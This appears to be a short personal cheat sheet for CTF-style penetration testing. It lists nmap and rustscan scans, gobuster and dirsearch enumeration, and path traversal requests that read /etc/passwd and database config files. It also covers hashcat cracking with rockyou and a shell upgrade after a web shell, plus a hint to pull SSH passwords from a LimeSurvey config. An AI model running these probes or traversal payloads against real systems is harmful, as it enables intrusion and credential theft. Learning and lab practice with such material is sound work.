# Guide404
simple guide for noobs

----------------------GENERAL-----------------
(For every domain you find:)
1. nano /etc/hosts
(Harden the web shell)

2. python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm

3
   




---------------------ENUMERATION---------------
1. rustscan --ulimit 10000 -a <IP> -- -sC -Pn
   or
   nmap -sCV -p- <IP>
2. dirsearch -u <IP>
   and
   gobuster vhost -u http://<domain> -w /usr/share/wordlists/dirb/small.txt -k --append-domain
3. (FOR DIR ENUMERATION ON YOUR KNOWN DOMAINS)--> gobuster dir http://<example.domain.com>/ -w /usr/share/wordlists/dirb/cmmon.txt


--------------------LFI---------------------
1. (throught pdf export/download) (known exploitable files: https://github.com/hussein98d/LFI-files/blob/master/list.txt):
   --> (burpsuite) GET /download?filename=../../../../../etc/passwd HTTP/1.1
   --> GET /download?filename=../../config/database.yml HTTP/1.1



-----------------------------HASHES-----------------------------
1. go at hashcat id tables and ctr+F to searc your hash and take the id
2. hashcat -m <id> hash.txt /usr/share/wordlists/rockyou.txt




-----------------------------WEBSHELL-----------------------
(after you get a web shell)
1. python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
2. cat /var/www/limesurvey/application/config/config.php (you might find password for ssh)










